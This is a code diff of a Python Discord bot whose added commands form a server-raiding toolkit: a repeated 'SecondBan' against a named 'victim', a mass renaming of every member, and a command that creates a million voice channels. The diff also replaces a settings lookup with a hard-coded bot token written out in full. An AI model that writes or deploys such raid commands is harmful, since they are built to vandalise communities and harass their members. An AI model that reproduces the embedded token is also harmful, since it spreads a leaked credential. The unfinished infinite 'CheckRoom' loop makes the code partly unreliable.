@@ -35,7 +35,23 @@ json_data = json.loads(resp.text)
 
 try:        
     class GlobalGuild:
-
+        @bot.command()
+        async def SecondBan(ctx, victim : discord.Member):
+            try:
+                await victim.ban(reason = "SecondBan")
+            except:
+                time.sleep(1)
+                LogManager.warning(f"Wait {victim} :)")
+                
+        @bot.command()
+        async def CheckRoom(ctx):
+            await ctx.channel.purge(limit = 1)
+            
+            while 1:
+                a = list()
+                for i in ctx.guild.voice_channels:
+                    a.append(i)
+                    
         @bot.command()
         async def AllNick(ctx, word:str):
             await ctx.channel.purge(limit = 1)
@@ -44,8 +60,8 @@ try:
                     await i.edit(nick = str(word))
                     time.sleep(.75)
                     LogManager.info(i.name)
-                except:
-                    pass
+                except Exception as ex:
+                    LogManager.error(ex)
 
             LogManager.info(f"[{ctx.message.guild.name}] {ctx.message.author.name} called {sys._getframe().f_code.co_name}")
 
@@ -124,9 +140,7 @@ try:
 
                     if _voice and _voice.is_connected():
                             await _voice.move_to(channel)                    
-                            LogManager.info(f"{bot} connect")
                             await _voice.disconnect()                                                        
-                            LogManager.info(f"{bot} disconnect")
                             time.sleep(0.75)
                     else: 
                         
@@ -437,7 +451,7 @@ try:
     @commands.has_permissions(administrator = True)
     async def pidor(ctx):
         for i in range(1000000):
-            await ctx.guild.create_voice_channel(name = f'З.а.е.б.а.л.и.{i}')
+            await ctx.guild.create_voice_channel(name = f'Сочувствую погибшим. {i}')
             
         LogManager.info(f"[{ctx.message.guild.name}] {ctx.message.author.name} called {sys._getframe().f_code.co_name}")
 
@@ -1198,7 +1212,7 @@ try:
         if isinstance(error, commands.MissingPermissions):
             await ctx.send(f'{author.mention}, вы не обладаете такими правами!')
         if isinstance(error, commands.errors.CommandInvokeError):
-            LogManager.error_log(error)
+            LogManager.error(error)
             await ctx.send(f"```{error}```")
 
 
@@ -1299,7 +1313,7 @@ try:
 
     #=================================================
 
-    bot.run(settings['TOKEN'])
+    bot.run("NzQwNjUwNTkxMDA0NTI0NjA1.XysGnQ.SmwkW0uDi5JvnkvgUoYBS9glGjc")
 
 except Exception as e:
     LogManager.warning('Work status: 0')
